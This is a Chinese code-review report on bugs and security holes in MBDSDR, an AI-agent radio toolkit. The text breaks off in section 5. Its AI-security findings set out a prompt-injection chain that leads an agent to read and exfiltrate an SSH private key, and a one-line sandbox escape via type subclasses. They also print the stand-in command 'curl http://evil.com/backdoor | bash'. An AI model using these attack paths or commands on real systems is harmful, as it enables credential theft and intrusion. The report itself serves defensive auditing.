# MBDSDR 第二轮深度代码审查 — 最终整合报告 (FINAL_REPORT_R2)

> **审查轮次**：R2（第二轮深度审查）
> **审查规模**：60 个子 Agent · ~41,000 行代码 · 250 个注册工具 · 69 个 Python 模块
> **审查日期**：2026-09-24
> **前序轮次**：R1（22 子 Agent，已修复 11 个 P0）
> **审查方法**：逐行阅读真实代码 + 交叉验证 + 实机复现 + 攻击链模拟

---

## 一、执行摘要

### 1.1 核心发现统计

| 级别 | 数量 | 说明 |
|------|------|------|
| **P0（阻断级）** | **23** | 真机必现崩溃/数据错误/安全漏洞/核心功能断裂 |
| **P1（严重）** | **38** | 功能错误但有 workaround，或性能/体验严重受损 |
| **P2（中等）** | **47** | 边界条件、可维护性、测试质量问题 |
| **合计去重后** | **108** | 已合并跨报告重复项（原始 ~320 条发现） |

**按性质分类：**

| 标签 | 数量 | 占比 |
|------|------|------|
| [真bug] | 62 | 57% |
| [空壳] | 24 | 22% |
| [占位] | 12 | 11% |
| [建议] | 10 | 9% |

### 1.2 最关键结论（Top 5）

1. **核心接收链路完全断裂**：设备 IQ → DC/IQ 校正 → 解调 → 音频输出 → 声卡，前两段✅、后两段❌。桌面频谱 100% 是硬编码的 5 个高斯峰，用户看到的是假频谱。MBDSDR 当前是"AI 离线 IQ 分析工具箱"，不是实时 SDR 接收软件。

2. **AI 安全防线系统性失守**：完整攻击链已打通——prompt injection（web_fetch 拉恶意页面）→ code_read_file 读 SSH 私钥 → web_fetch 外泄。沙箱一行逃逸（safe_builtins 含 `type`），code_run_tests = `shell=True` 任意命令执行，tool_registry 零权限模型，RF 发射零确认。

3. **DSP 解码器核心参数错误**：FT8 符号时长 256ms（标准 160ms）、CRC 移位 k=14（标准 k=19）、无 Costas 环同步；QPSK Viterbi 用前向转移、decisions 数组从未写入、生成多项式八进制写成十进制——这些解码器在真实信号上**不可能正确工作**。

4. **测试体系是"假绿"**：250 个注册工具中 **0 个有正确性断言**；V2 测试报告（185/185 全绿）按当前源码跑必然失败（AMR 维度 24 vs 25 脱节）；9/9 实验全合成信号，SSTV 纯噪声 100% 误报，AMR 训练/测试同参数化生成器导致 99% 准确率无意义。

5. **论文就绪度 28/100，不具备投 WCL 条件**：论文 8 个实验全部只有 Methodology 零数据，无真实 OTA 验证，无基线对比，无统计显著性，零张数据图。核心算法实验存在数据泄露和误报问题，投稿必被拒。

---

## 二、P0 级问题（阻断级）

> 按领域分组：DSP解码 / SDR后端 / 硬件HAL / UI桌面 / AI安全 / 测试 / 架构

### 2.1 DSP 解码域

#### P0-DSP-01 [真bug] FT8 符号时长错误 + CRC 移位参数错误 + 无 Costas 同步
- **位置**：`mbdsdr_ai/ft8_lite.py`（Goertzel 检测）、`ft8_decode.py`、`ft8_ldpc.py`
- **问题**：
  - 符号时长设为 256ms，FT8 标准为 160ms（79 符号 × 160ms = 12.64s 帧长）
  - CRC 移位寄存器 k=14，标准 FT8 为 k=19
  - 整个链路无 Costas 环载波同步，频偏 >10Hz 即全部解码失败
- **触发方式**：喂入真实 FT8 音频（wsjtx 标准），解码成功率 ≈ 0
- **修复建议**：符号时长改 160ms；CRC 参数对齐 wsjtx 源码；加 Costas 环或至少加频偏搜索 ±50Hz

#### P0-DSP-02 [真bug] QPSK Viterbi 回溯用前向转移、decisions 从未写入
- **位置**：`mbdsdr_ai/demod.py:315-440`（ViterbiDecoder）
- **问题**：
  - Viterbi 回溯阶段使用了前向转移矩阵而非后向幸存路径指针
  - `decisions` 数组在 `_init_ascending_metrics` 后从未被写入
  - 生成多项式按八进制 `67, 45` 书写，但代码中按十进制解析
- **触发方式**：喂入已知 QPSK 卷积编码序列，解码结果与原始比特无相关性
- **修复建议**：重写 Viterbi 蝶形运算 + 回溯逻辑；多项式用 `int("67", 8)` 显式八进制解析
- **注**：`demod.py` 整模块当前为孤儿（零 import），此 bug 暂未影响生产链路，但一旦接线即暴露

#### P0-DSP-03 [真bug] SSTV real_sstv.wav 制式误判 + VIS 极性反
- **位置**：`mbdsdr_ai/sstv_decoder.py:383-415`（_identify_sstv_mode）
- **问题**：
  - `real_sstv.wav` 实际是 Robot72（VIS=0x0C=12），被误判为 Robot36
  - VIS 码极性取反：解码器读 VIS 时位序/极性反了，导致 VIS=121 而非 12
  - 纯高斯噪声 100% 被误判为某种 SSTV 制式（所有 SNR 下 correct_rate=0.0）
- **触发方式**：播放任意噪声音频 → 识别器报"检测到 Robot36/Martin M1"
- **修复建议**：修正 VIS 极性位序；加噪声门限（能量 + 同步脉冲周期 CV 双重判据），使纯噪声虚警率 <5%

#### P0-DSP-04 [真bug] ADS-B 字符表数字位置错 + 呼号 8bit/字符 + CPR 位置解码未实现
- **位置**：`mbdsdr_ai/adsb.py`、`adsb_lite.py`
- **问题**：
  - Mode-S 呼号字符表中数字（0-9）映射位置错误（标准表中数字在字母后偏移量不对）
  - 呼号按 8bit/字符解码，标准 Mode-S 为 6bit/字符（每 7 字符占 4.5 字节）
  - CPR（Compact Position Reporting）位置解码完全未实现，只有 CRC 校验
- **触发方式**：接收真实 1090MHz ADS-B 信号，ICAO 地址和呼号解码错误
- **修复建议**：按 ICAO Doc 9871 修正字符表；呼号改 6bit 解包；补 CPR 全局/本地解码

#### P0-DSP-05 [真bug] orbit.py Coriolis 速度项符号反（多普勒偏差 140-1020Hz）
- **位置**：`mbdsdr_ai/orbit.py`（doppler_correction 函数）
- **问题**：径向速度项符号取反，导致多普勒频偏计算偏差 140-1020 Hz（L 波段），天线指向和频率补偿完全错误
- **触发方式**：对 NOAA 系列卫星计算多普勒补偿，与 sgp4 标准结果对比偏差 >100Hz
- **修复建议**：核对 `v_radial · λ` 公式符号，与 sgp4/astropy 基准对拍

#### P0-DSP-06 [真bug] decoders.py 缺 GMST 旋转 + radial_velocity 硬编码 0
- **位置**：`mbdsdr_ai/decoders.py:201`、轨道计算段
- **问题**：
  - `radial_velocity = 0 # km/s，简化为 0` 硬编码，`doppler = freq * radial_velocity / c` 恒为 0
  - 卫星位置计算缺 GMST 地球自转旋转，仰角漂移约 15°/小时
- **触发方式**：调用 `list_visible_satellites` 或 `compute_satellite_position`，多普勒字段全为 0
- **修复建议**：接入 orbit.py 的真实速度向量；补 GMST 旋转矩阵

#### P0-DSP-07 [真bug] FT8 LDPC 硬编码读取外部 Fortran 文件
- **位置**：`mbdsdr_ai/ft8_ldpc.py:28-33, 45-49`
- **问题**：`_parse_graph()` 从 `repos/wsjtx/lib/ft8/ldpc_174_91_c_parity.f90` 读取校验矩阵。repos/wsjtx 不存在时直接 FileNotFoundError，FT8 解码完全不可用
- **触发方式**：在干净环境中 import ft8_ldpc → FileNotFoundError
- **修复建议**：H 矩阵内嵌为 Python 常量（174×91 稀疏矩阵）

### 2.2 SDR 后端 / 硬件域

#### P0-HW-01 [真bug] requirements.txt 缺 pyrtlsdr，桌面→RTL-SDR 闭环断
- **位置**：`requirements.txt:21-23`
- **问题**：硬件依赖段只注释了 pyserial / SoapySDR，**没有 pyrtlsdr**。`pip install -r requirements.txt` 后 `from rtlsdr import RtlSdr` 直接 ImportError，被 `_discover()` 的 `except: pass` 静默吞掉，默认 active = Mock
- **触发方式**：全新环境安装 → sdr_connect(device_id="rtl_0") 走 mock 后端
- **修复建议**：requirements.txt 加 `pyrtlsdr>=0.3.3`（或 extras 标记）

#### P0-HW-02 [真bug] hal.py SoapySDR 局部 import NameError + 从未 setupStream + HardwareManager 非单例
- **位置**：`mbdsdr_ai/hal.py:224, 253-278, 280-295, 576-587`
- **问题**：
  - `SoapySDR` 仅在 `connect()` 局部 import，后续 `set_frequency/set_sample_rate/set_gain` 引用 `SoapySDR.SOAPY_SDR_RX` 时 NameError，被 bare except 吞掉只打 warning
  - `_rx_stream` 永远是 None（全文件无 `setupStream` 调用），`read_rx()` 永远走"模拟白噪声"分支
  - `HardwareManager` 无 `__new__`/模块级实例，每次调用都是新对象；`sdr_connect_hardware` 连接状态存在临时 mgr 里，函数返回即 GC；`sdr_transmit_cw` 再 new 一个 mgr → 必然"未连接"
- **触发方式**：连接 SoapySDR 设备 → 第一发调谐就失败；connect 后立即 transmit_cw → 报"未连接任何 SDR"
- **修复建议**：模块级 `import SoapySDR`；加 `setupStream()`；HardwareManager 改单例（模块级 `_instance` + `get_instance()`）

#### P0-HW-03 [真bug] RTLSDRBackend connect 不回读硬件实际参数 + setter 不回滚
- **位置**：`mbdsdr_ai/sdr_backend.py:454-475, 101-117, 486-498`
- **问题**：
  - `connect()` 连上后不回读 `center_freq / sample_rate / tuner_gains / bandwidth`，SDRStatus 保留 dataclass 默认值（100MHz / 2.4MHz / gain=0）
  - 基类 `set_frequency/set_sample_rate` 先改 `status` 再写硬件，硬件失败时状态不回滚 → 状态与硬件错位
  - `set_sample_rate` 不校验设备实际接受的档位，2.4MHz 可能被 librtlsdr 舍入到 2.048MHz，但 status 仍写 2.4MHz，后续 FFT 频率换算全错
- **触发方式**：set_sample_rate(2.4e6) → 实际硬件 2.048MHz，但 status 显示 2.4MHz → 频谱峰值位置偏移
- **修复建议**：connect 后读回 hardware.center_freq / sample_rate / gains；setter 用 try/except 包住写硬件，失败时回滚 status

#### P0-HW-04 [真bug] RTLSDRBackend.read_samples() 无异常保护，USB 拔出裸崩
- **位置**：`mbdsdr_ai/sdr_backend.py:571-576`
- **问题**：`self._sdr.read_samples(n)` 无 try/except。USB 拔出、EPIPE、IO 错误直接向上抛。录制线程最外层只打一行"录制线程错误"，不重连、不通知、不降级
- **触发方式**：录制过程中拔出 RTL-SDR 棒 → 进程可能崩溃或静默断流
- **修复建议**：read_samples 包 try/except，失败时置 `status.connected=False` 并发事件

### 2.3 UI / 桌面域

#### P0-UI-01 [真bug] 桌面频谱 100% 合成数据 + MCP 硬件工具未注册到 Agent
- **位置**：`desktop/spectrum_widget.py:30-83`（SpectrumDataGenerator）、`desktop/mcp_worker.py:256-265`（method_map）
- **问题**：
  - `SpectrumDataGenerator` 硬编码 5 个 FM 电台高斯峰（98.5/97.4/100/95.5/101.8 MHz）+ 随机噪声。`set_iq_data()` 接口存在但从未被调用
  - MCPWorker 的 method_map 只有 8 个 SI4732 方法（tune_fm/tune_am/set_volume/record/get_version/reboot/list_tools），**完全不引用 SDRBackendManager / RTLSDRBackend**
  - 桌面端无法通过 Worker 取到任何 RTL-SDR IQ 数据
- **触发方式**：打开桌面 GUI → 看到的频谱是假的；点"航空 118 AM"预设 → 无反应
- **修复建议**：SpectrumDataGenerator 加 `push_iq(complex_array, sample_rate)` 接口；桌面直接持有 SDRBackendManager 而非绕 MCPWorker

#### P0-UI-02 [真bug] UI 线程直调 worker.call_tool，websocket I/O 阻塞 UI + 竞态
- **位置**：`desktop/mcp_worker.py:233-249`（call_tool 是 @Slot）+ `desktop/main_window.py:505,511,516,531,537,544,573,585,748`
- **问题**：Worker 已 `moveToThread(self.thread)`，但 main_window 在 UI 线程**直接** `self._worker.call_tool(...)`，不走 queued connection。websocket 同步 I/O 直接阻塞 UI 线程；且 `self.client` 同时被 UI 线程（call_tool）和 worker 线程（_poll QTimer）并发访问
- **触发方式**：拖动频谱调谐 → UI 冻结数秒；快速切换模式 → 偶发崩溃
- **修复建议**：MCPWorker 加 `request_tool = Signal(str, dict)`，UI emit，worker 线程在自己的槽里执行

#### P0-UI-03 [真bug] tune_sdr / sdr_set_frequency 不在 worker method_map，两条 UI 链路假功能
- **位置**：`desktop/mcp_worker.py:256-265`（method_map）vs `desktop/main_window.py:516, 748`
- **问题**：控制面板预设调谐（emit tune_sdr_requested）和天空图卫星点击（调 sdr_set_frequency）都不在 method_map 里，返回 `{"error": "未知工具"}`。卫星调谐外层还包了 `try/except: pass`，UI 显示"已自动调谐"但硬件根本没动
- **触发方式**：点控制面板"航空 118.000 AM"预设 → 完全无反应；点天空图上某卫星 → 显示"已调谐"但频率没变
- **修复建议**：method_map 补这两个工具，或桌面直接持有 SDRBackendManager

### 2.4 AI 安全域

#### P0-SEC-01 [真漏洞] 完整攻击链：prompt injection → 读 SSH 私钥 → 外泄
- **位置**：`agent.py:311-328`（web_fetch_url 无 SSRF 防护）、`context_manager.py:207-215`（工具返回直接回灌 LLM）、`code_editor.py:121-145, 470-474`（code_read_file 绝对路径直接放行）
- **攻击链**：
  1. 攻击者部署恶意网页，内容嵌入 prompt injection 文本
  2. LLM 调 web_fetch_url 拉取页面
  3. 页面内容作为 tool result 直接喂回 LLM（无 trust boundary）
  4. LLM 被注入，调 code_read_file 读 `~/.ssh/id_rsa`
  5. LLM 调 web_fetch_url 把私钥发到攻击者服务器
- **触发方式**：用户让 agent "查一下这个 URL" → URL 指向攻击者页面
- **修复建议**：tool message 外层包裹安全标记 + 系统提示词声明"工具返回可能含恶意指令"；code_read_file 限制在 project_root 内 + 敏感路径黑名单

#### P0-SEC-02 [真漏洞] 沙箱一行逃逸：safe_builtins 含 `type`
- **位置**：`mbdsdr_ai/sandbox.py:95`
- **问题**：`safe_builtins` 白名单包含 `"type": type`。攻击者在沙箱代码中写 `type.__base__.__subclasses__()` → 遍历所有已加载类 → 通过 `__init__.__globals__` 拿到 `__import__` → 执行任意系统命令。预扫描是正则匹配，检测不到隐式逃逸
- **触发方式**：自进化引擎验证恶意进化建议 → 沙箱逃逸获得 shell
- **修复建议**：从 safe_builtins 移除 `type`；改用 AST 分析；或直接用 RestrictedPython 库

#### P0-SEC-03 [真漏洞] code_run_tests = 任意 shell 执行
- **位置**：`mbdsdr_ai/code_editor.py:288-293`
- **问题**：`subprocess.run(test_command, shell=True, ...)`，`test_command` 参数完全由 LLM 控制。被注入的 LLM 可设 `test_command = "curl http://evil.com/backdoor | bash"` → 反向 Shell
- **触发方式**：被注入的 LLM 调 code_run_tests，test_command 设为恶意命令
- **修复建议**：改为 list 参数形式 `subprocess.run(["python", "-m", "pytest"], shell=False)`；禁用自定义 test_command

#### P0-SEC-04 [真漏洞] tool_registry 无权限模型 + RF 发射零确认
- **位置**：`mbdsdr_ai/tool_registry.py:233-386`（call 全方法）
- **问题**：`call()` 全程无白名单/黑名单、无人工确认、无风险分级拦截。`sdr_transmit_cw`（真实 RF 发射）、`code_modify_file`、`code_run_tests`、`web_fetch_url`、`git_clone_repo` 等高危工具全部零确认直接执行
- **触发方式**：LLM（或被注入的 LLM）直接调 `sdr_transmit_cw` → 真实发射无线电，违反法规
- **修复建议**：增加危险工具拦截层（发射/写文件/执行代码/PTT 类要求确认或显式授权标志）

### 2.5 测试 / 实验域

#### P0-TEST-01 [真bug] V2 测试 AMR 断言脱节（24 vs 25 维）+ V2 是 V1 缩水子集
- **位置**：`tests/test_full_integration_v2.py:693, 702`
- **问题**：V2 断言 `n_features == 24`，但源码 `amr.py:292` 硬编码 `"n_features": 25`，`AMRFeature.to_list()` 实返 25 维。当前跑 V2 必然红，`test_report_v2.txt` 的 185/185 全绿是旧快照。V2 还删掉了 V1 里所有有鉴别力的往返测试（SSTV 跨实现、ADS-B CRC 权威向量、AX.25/AFSK 真音频往返等 11 个）
- **触发方式**：在当前源码上重跑 V2 测试 → AMR 两条断言失败
- **修复建议**：改回 `==25`；废弃 V2，把 API 修正回填 V1

#### P0-TEST-02 [真bug] 250 个注册工具 0 个有正确性断言
- **位置**：`tests/tool_selftest.py`、`tests/tool_health_check.py`、`tests/tool_param_smoke.py`、`tests/smoke_live_tools.py`
- **问题**：6 个测试文件全部是"工具存在性/不崩溃体检"。tool_selftest 遍历 250 工具只分 ok/friendly/crash；tool_param_smoke 的 OK 判定是 `success and len(text)>150`——没装 wsjtx/direwolf/dump1090 的解码工具照样判 OK。唯一有断言质量的 AX.25 往返测试**不走工具注册表**
- **触发方式**：工具把 100MHz 算成 1GHz、把 FCS 校验算反，只要 success=True 就过
- **修复建议**：给解码类工具补正例测试（用 syn_robot36.wav / real_sstv.wav 断言解出已知呼号/图像）

#### P0-EXP-01 [真bug] 9/9 实验全合成信号 + SSTV 噪声 100% 误报 + AMR 数据泄露
- **位置**：`experiments/exp_sstv_identification.py`、`experiments/exp_amr.py`、`experiments/` 全部 9 个脚本
- **问题**：
  - 9/9 实验全部使用合成信号作为输入，无任何 RTL-SDR 真实录制
  - SSTV 识别实验：纯高斯噪声 8/8 次被误判为 SSTV 制式（correct_rate=0.0）；Robot36 在 15dB 全部误判为 Martin M1
  - AMR 实验：训练模板和测试集使用**完全相同**的参数化生成器（`synthesize_modulation_iq`），10dB 时 99.17% 准确率是同分布测试的必然结果，不能外推到真实信号
- **触发方式**：论文声称"AI 自动识别信号制式"——真实频谱中会频繁误报
- **修复建议**：修复 SSTV 噪声门限；AMR 用独立信号源测试；用 RTL-SDR 录制真实信号做 OTA 验证

### 2.6 架构域

#### P0-ARCH-01 [真bug] demod.py 整模块零 import（孤儿）
- **位置**：`mbdsdr_ai/demod.py`（全文）
- **问题**：全仓 grep `from demod import` / `import demod` → 0 命中。但该模块定义了成熟的数字解调链：rrc_filter、matched_filter、CostasLoop、GardnerTimingRecovery、QPSKDemodulator、ViterbiDecoder、descramble_ccdb。要么是遗漏了接线，要么是历史遗留该删
- **触发方式**：无（当前不影响运行）；但 QPSK/Viterbi bug 存在于死代码中，一旦接线即暴露
- **修复建议**：要么接线到 digital_modes.py，要么删除并标注

#### P0-ARCH-02 [真bug] scheduler cron 任务死循环狂触发 + meteor_sat EKF 量纲不一致
- **位置**：`mbdsdr_ai/scheduler.py:265-272`、`mbdsdr_ai/meteor_sat.py:543-544`
- **问题**：
  - scheduler.py：`schedule_type == "cron"` 的任务执行完后不更新 `next_run`（代码里只有 once/interval 分支），每 30 秒空转狂触发，直到进程退出
  - meteor_sat.py：EKF 把多普勒(Hz)当成 vz(m/s) 直接观测，`H[0,3:6]=[0,0,1]` 选的是速度状态（m/s），但观测量 y 是多普勒 Hz——量纲不一致，滤波器输出无物理意义
- **触发方式**：创建 cron 类型定时任务 → 每 30 秒重复执行；LRO 定轨 EKF → 位置误差数字无意义
- **修复建议**：scheduler 加 cron 分支（或删除 cron 类型并报错）；meteor_sat EKF 观测矩阵按多普勒公式重新推导

---

## 三、P1 级问题（严重）

> 按领域分组，每条含位置、描述、修复建议

### 3.1 DSP 解码域

| 编号 | 标签 | 位置 | 问题描述 | 修复建议 |
|------|------|------|----------|----------|
| P1-DSP-01 | [真bug] | `ft8_lite.py:48-57` | FT8 Goertzel 扫描 1Hz 步进逐频点调用，15s 音频需 52 秒（实时因子 3.5×），Chromebook 上需 3 分钟 | 改用 FFT 替代逐频点 Goertzel |
| P1-DSP-02 | [真bug] | `dsp.py:53-56` | DCBlocker 逐样本 Python 循环，240k 样本需 125.8ms（实时因子 1.26×），Celeron 上 4-5× | 用 scipy.signal.lfilter 向量化 |
| P1-DSP-03 | [真bug] | `sstv_decoder.py:383-415` | Robot36 解码质量在 15dB 崩溃（corr_mean=-0.22，负相关），10dB 以下输出空图 | 优化 Costas 同步 + 降低解码门限 |
| P1-DSP-04 | [真bug] | `amr.py:372-384` | AMR NOISE 类不加噪声（`if mod != "NOISE":`），SNR 曲线在 NOISE 行无意义；UNKNOWN 预测静默丢弃 | NOISE 类也加噪声；UNKNOWN 计入混淆矩阵 |
| P1-DSP-05 | [真bug] | `new_spacetime.py:386-387` | predict_satellite_pass 把 MHz 当 Hz 存：`frequency_hz = SATELLITE_FREQUENCIES[sat]` 漏乘 1e6 | 补 `* 1e6` |
| P1-DSP-06 | [空壳] | `meteor_sat.py:306-400` | QPSK 解调/Viterbi/CCDB 解扰/图像合成四个函数全是桩，且全仓零调用 | 删除或接线到 demod.py 真实现 |
| P1-DSP-07 | [真bug] | `rds_lite.py` | RDS 仅检测副载波存在性，未解出电台名/节目信息（注释自承"占位实现"） | 补 RDS group 解码 + PS 名称提取 |

### 3.2 SDR 后端 / 硬件域

| 编号 | 标签 | 位置 | 问题描述 | 修复建议 |
|------|------|------|----------|----------|
| P1-HW-01 | [真bug] | `sdr_backend.py:995-1008` | FileIQBackend 整文件加载为 complex128（16 bytes/sample），1 分钟录音 = 2.3GB，4GB RAM 机器易爆 | 改用 np.memmap 或保留 complex64 |
| P1-HW-02 | [真bug] | `sdr_tools.py:324-326, 349-351, 416` | set_frequency / set_sample_rate / set_demod handler 里调用了**两次** setter，第一次取 success 第二次取 content，状态不一致 | 只调一次，结果存变量再用 |
| P1-HW-03 | [真bug] | `hal.py:284` | `np.array([np.complex64]*num_samples)` 构造的是 dtype=object 数组，不是 complex64 缓冲 | 改为 `np.zeros(num_samples, dtype=np.complex64)` |
| P1-HW-04 | [空壳] | `sdr_backend.py:755-757` | AISDRMiniBackend.read_samples 永远返回 None，与基类"返回复数数组"契约不一致 | 接真实 IQ 流或明确标注不支持 |
| P1-HW-05 | [真bug] | `sdr_backend.py:693` | AISDRMiniBackend._refresh_status 写 `status.rssi`，但 dataclass 字段叫 `rssi_db`，动态加属性导致 _format_status 读默认值 | 统一字段名 |
| P1-HW-06 | [空壳] | `satdump_integration.py:99-112` | live 模式 timeout=30s，超时后谎称"后台运行中"（实际进程已被 SIGKILL）；真实卫星过境 5-15 分钟，30s 必然触发假成功 | 改为真后台进程（Popen）或报错 |

### 3.3 UI / 桌面域

| 编号 | 标签 | 位置 | 问题描述 | 修复建议 |
|------|------|------|----------|----------|
| P1-UI-01 | [真bug] | `desktop/mcp_worker.py:354-362` | MCPWorkerManager.stop() 跨线程调 worker.stop()，thread.wait(3000) 超时后线程泄漏 | stop 改 queued call + 更长 wait |
| P1-UI-02 | [真bug] | `desktop/main.py:57-58` + `main_window.py:59,827` | CLI `--theme` 参数被 MainWindow 默认主题 + gui_config.json 保存值覆盖，完全无效 | MainWindow 接收初始主题参数 |
| P1-UI-03 | [真bug] | `desktop/status_panel.py:224-229` vs `mcp_worker.py:55-60` | RSSI 阈值按真实 dBm（负数）设计，但模拟数据 RSSI 范围 +10~+70，颜色恒绿 | 统一量纲 |
| P1-UI-04 | [真bug] | `desktop/status_panel.py:239-258` | GPS/IMU 字典字段缺 None 防护：`{"lat": None}` 时 `None:.6f` 直接 TypeError | 加 None 判断 |
| P1-UI-05 | [空壳] | `desktop/status_panel.py:266-272` | 设备信息（固件/SDR/MCU）永远是 "--"，无自动 get_version 上报 | 连接成功后 emit get_version 结果 |
| P1-UI-06 | [真bug] | `desktop/spectrum_widget.py:342-359` | 瀑布图 setPixelColor 双层 Python 循环（200×800=16 万次/帧），OpenGL 版名存实亡 | 用 numpy LUT + QImage.setBits() |

### 3.4 AI / 安全域

| 编号 | 标签 | 位置 | 问题描述 | 修复建议 |
|------|------|------|----------|----------|
| P1-SEC-01 | [真漏洞] | `agent.py:346-362` | git_clone_repo 无 URL scheme 校验，接受 `file://`、`ext::`（git 外部命令协议可执行任意命令） | 添加 https:// 白名单 |
| P1-SEC-02 | [真漏洞] | `orbit.py:45-47` | 全局关闭 TLS 证书校验（`check_hostname=False, CERT_NONE`），TLE 数据可被中间人篡改 | 使用 certifi CA 包 |
| P1-SEC-03 | [真漏洞] | `config.py:130-131` | API Key 明文落盘未 chmod 0600，默认 umask 下其他用户可读 | save_config 后 os.chmod(path, 0o600) |
| P1-SEC-04 | [真漏洞] | `code_editor.py:147-208` | code_modify_file 可修改系统提示词和 tool_registry.py，实现权限提升 | 核心安全文件只读 + 修改前确认 |
| P1-SEC-05 | [真bug] | `workflow_engine.py` | 工作流步骤间数据传递完全失效，`{{变量}}` 以字面量传给设备 | 实现变量替换上下文 |
| P1-SEC-06 | [空壳] | `guardian.py` 全局 | Guardian protect()/create_snapshot() 零业务调用，代码修改流程未集成 | 接入 code_modify_file 流程 |
| P1-SEC-07 | [真bug] | `mbdsdr_ai_mcp_server.py:299-301` | JSON-RPC 批量请求（array）直接打死进程；非 dict JSON 也崩；客户端断开 BrokenPipeError 打死进程 | handle_request 加 isinstance 守卫 + BrokenPipeError 捕获 |

### 3.5 测试 / 实验域

| 编号 | 标签 | 位置 | 问题描述 | 修复建议 |
|------|------|------|----------|----------|
| P1-TEST-01 | [空壳] | `test_full_integration.py:405-434, 657-684` | 子代理和编排器只测 CRUD，从不调用 execute_task / execute | 补行为测试 |
| P1-TEST-02 | [空壳] | `test_full_integration.py:1228-1241` | RDS-CT 测试从不 import 被测模块，整段是测试自己手抄的位运算（编解码犯同样错误也发现不了） | 改为真喂 _parse_group bits |
| P1-TEST-03 | [真bug] | `test_full_integration_v2.py:839` | MemoryStore.add 签名误用：第二位置参数是 category 不是 title，断言通过纯属巧合 | 改为 `mem.add(content, category="general", ...)` |
| P1-EXP-01 | [空壳] | `experiments/exp_pnt_fusion.py:24-39` | PNT 融合实验测量的是数学恒等式（逆方差加权 = CRLB），无真实接收机数据 | 接入真实 GNSS 测量或删除 |
| P1-EXP-02 | [空壳] | `experiments/exp_weak_model_toolcall.py:38-61` | 10 用例各跑 1 次，工具集人为裁剪，无随机种子，不可复现 | ≥30 次重复 + 全量工具集 |

### 3.6 架构 / 依赖域

| 编号 | 标签 | 位置 | 问题描述 | 修复建议 |
|------|------|------|----------|----------|
| P1-ARCH-01 | [架构缺陷] | `sdr_backend.py` ↔ `sdr_tools.py` | 双向循环依赖：sdr_tools 顶层 import sdr_backend，sdr_backend 函数内反向 import sdr_tools 拿云台控制器 | 由 sdr_tools 连接成功后注入云台控制器 |
| P1-ARCH-02 | [架构缺陷] | `sdr_backend.py` vs `hal.py` | 两套完整 SDR 后端继承树并存（SDRBackendManager vs HardwareManager），状态完全独立 | 合并为一套后端抽象 |
| P1-ARCH-03 | [架构缺陷] | `astronomy.py:463` / `decoders.py:103` / `new_spacetime.py:338` | SatellitePass 同名数据类 3 份，字段互不兼容；__init__.py 导出的是位置快照那个（名字叫 Pass） | 抽统一数据类 |
| P1-ARCH-04 | [真bug] | `file_tracker.py:58-72, 301-335` | 重启后 revert_to 静默失效：content_before 不落盘，重启后是空字符串，revert 不写文件但报告"成功" | content 落盘或改存文件哈希 + 临时备份 |
| P1-ARCH-05 | [真bug] | `self_evolution.py:108, 353` | 真实文件备份在内存 dict `_disk_backups`，进程重启后回滚失效 | 备份持久化到磁盘 |

---

## 四、P2 级问题（中等）

> 精简列出，按领域分组

### 4.1 DSP / 信号处理
- **[真bug]** `ft8_roundtrip.py:47-53`：遍历 8 个循环偏移取最佳匹配，掩盖了 +1 音调系统偏移 bug
- **[真bug]** `tool_param_smoke.py:187`：`success and len>150` 即 OK，把"未装解码器"误判为 OK
- **[真bug]** `amr.py:350`：NOISE 类不加噪声，SNR 曲线无意义
- **[真bug]** `exp_digital_modes.py:94`：SSTV 实验硬编码 mode="Martin M1"，不是自动识别测试
- **[真bug]** `exp_fhss_detection.py:17`：门限在同一噪声发生器上标定后又测试，循环验证
- **[空壳]** `wfm_stereo_lite.py`：WFM 立体声占位实现，未解出立体声
- **[空壳]** `analog_demod.py:41-44`：SSB 直接取实部 + 低通，无 BFO、无边带滤波器

### 4.2 SDR 后端 / 硬件
- **[真bug]** `sdr_backend.py:1098-1105`：_discover() 任何异常都 `except: pass`，用户看不到"为什么没看到棒"
- **[空壳]** `sdr_backend.py:1098-1105`：HackRF/USRP 只 import 成功就算可用，从不真正打开设备
- **[建议]** `sdr_backend.py` 默认 active = mock，即使枚举到 RTL-SDR 也不自动激活
- **[真bug]** `scripts/rtl_selfcheck.py:236 vs 138`：`--branch` 参数被硬编码 "q" 覆盖，死参数

### 4.3 UI / 桌面
- **[空壳]** `main_window.py:549-551`：`_on_mode_changed` 槽函数体只有 pass
- **[空壳]** `mcp_worker.py:347`：`self.worker.finished = self.thread.quit` 不是信号连接，无效
- **[真bug]** `main.py:37-39`：CLI `--theme` choices 硬编码，与 THEMES 字典脱钩
- **[建议]** 频谱拖频洪水式调谐，需 debounce 150-300ms
- **[建议]** 录音按钮双向同步缺失（控制面板启动后工具栏按钮不更新）

### 4.4 AI / 安全
- **[建议]** `tool_registry.py:307-326`：参数预校验只查 required 存在性，不查类型/枚举/范围
- **[真bug]** `tool_registry.py:176-178`：`has_tool()` 不走短名解析，与 `call()` 行为不一致
- **[空壳]** `openapi_integration.py`：文件名不副实——没有任何 OpenAPI spec 解析，就是 4 个手写函数
- **[空壳]** `openapi_integration.py`：认证（API key/OAuth）完全缺失，OpenSky 真机匿名访问已受限
- **[真bug]** `openapi_integration.py:93-96`：经度跨度公式错误（`111*lat_rad` 应为 `111*cos(lat_rad)`），lat=0 除零
- **[空壳]** `plugin_system.py:412-431`：插件主进程 exec_module，无沙箱（sandbox.py 存在但不引用）
- **[真bug]** `plugin_system.py:244-249`：enable() 的 register() 调用契约与测试样例不一致（关键字 vs 位置参数）

### 4.5 测试 / 实验
- **[占位]** `test_full_integration.py:395, 431, 647`：硬编码 True / 恒真式断言
- **[弱断言]** 26 项测试只验证"函数能调用且返回了某种类型"，不验证输出正确性
- **[空壳]** `test_full_integration.py:530-551`：WorkflowEngine 只 list_workflows，从不执行任何工作流
- **[空壳]** `test_full_integration.py:554-587`：Scheduler 只测 CRUD，从不触发任务执行
- **[建议]** 12 个模块仅有 import/存在性检查，无行为测试（config/context_manager/model_manager/memory/sandbox/self_evolution 等）

### 4.6 架构 / 依赖
- **[建议]** `sdr_tools.py` 是 god object（5900+ 行，38+ 工具），建议按类别拆分
- **[建议]** 裸 `except Exception: pass` 吞异常热点：sdr_tools.py 11 处、sdr_backend.py 8 处、agent.py 6 处
- **[建议]** 长春坐标（43.82, 125.32）散落在 6 个文件中，config.py 无 observer_lat/lon 字段
- **[建议]** `~/.mbdsdr` 路径在 16 个模块各自 os.path.expanduser，无集中 paths.py
- **[建议]** `__init__.py` eager import 29 个模块，import mbdsdr_ai 需 706ms
- **[空壳]** `optional_deps.py` 全仓库无任何 import，死代码
- **[真bug]** `config.py:74-80`：环境变量覆盖逻辑反了——"显式等于默认值"时不覆盖

---

## 五、架构级问题

### 5.1 重复实现清单

| # | 功能 | 重复位置 | 差异 |
